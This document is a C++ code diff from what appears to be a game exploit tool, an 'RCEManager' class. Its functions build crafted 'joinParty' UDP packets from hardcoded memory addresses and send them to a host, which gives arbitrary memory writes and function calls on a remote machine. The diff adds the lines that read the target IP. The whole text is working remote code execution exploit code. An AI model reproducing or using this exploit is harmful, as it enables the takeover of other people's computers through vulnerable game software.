@@ -220,6 +220,7 @@ void RCEManager::RCE_WriteUInt(int Addr, int Value)
 	sprintf_s(PayLoad, "ÿÿÿÿ1joinParty 149 1 1 0 0 0 32 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 %i %i %i 0 %i %i %i %i %i %i %i", 0x413600, 0x1B8B7F0, 0x665569, 0x4011FE, 0x413600, Addr - 0x14, 0x665569, Value, 0x4011FE, 0x56A202);
 	PayLoad[0] = 0xFF; PayLoad[1] = 0xFF; PayLoad[2] = 0xFF; PayLoad[3] = 0xFF;
 
+	LPBYTE IpAddress = (LPBYTE)Offsets::host_ip;
 	InitUDPSock(VariadicText("%u.%u.%u.%u", IpAddress[0], IpAddress[1], IpAddress[2], IpAddress[3]).c_str(), PayLoad);
 }
 
@@ -229,6 +230,7 @@ void RCEManager::RCE_WriteInt(int Addr, int Value)
 	sprintf_s(PayLoad, "AAAA1joinParty 149 1 1 0 0 0 32 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 %i %i %i 0 %i %i %i %i %i %i %i", 0x413600, 0x01B8B804 - 0x14, 0x665569, 0x4011FE, 0x413600, Addr - 0x14, 0x665569, Value, 0x4011FE, 0x56A202);
 	PayLoad[0] = 0xFF; PayLoad[1] = 0xFF; PayLoad[2] = 0xFF; PayLoad[3] = 0xFF;
 
+	LPBYTE IpAddress = (LPBYTE)Offsets::host_ip;
 	InitUDPSock(VariadicText("%u.%u.%u.%u", IpAddress[0], IpAddress[1], IpAddress[2], IpAddress[3]).c_str(), PayLoad);
 }
 
@@ -238,5 +240,6 @@ void RCEManager::RCE_Call(int address)
 	sprintf_s(PayLoad, "AAAA1joinParty 149 1 1 0 0 0 28 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 %i %i %i 0 %i %i %i %i %i", 0x413600, 0x01B8B804 - 0x14, 0x665569, 0x4011FE, 0x00675B5F, address, 0x005FA5DE, 0x0056A202);
 	PayLoad[0] = 0xFF; PayLoad[1] = 0xFF; PayLoad[2] = 0xFF; PayLoad[3] = 0xFF;
 
+	LPBYTE IpAddress = (LPBYTE)Offsets::host_ip;
 	InitUDPSock(VariadicText("%u.%u.%u.%u", IpAddress[0], IpAddress[1], IpAddress[2], IpAddress[3]).c_str(), PayLoad);
 }
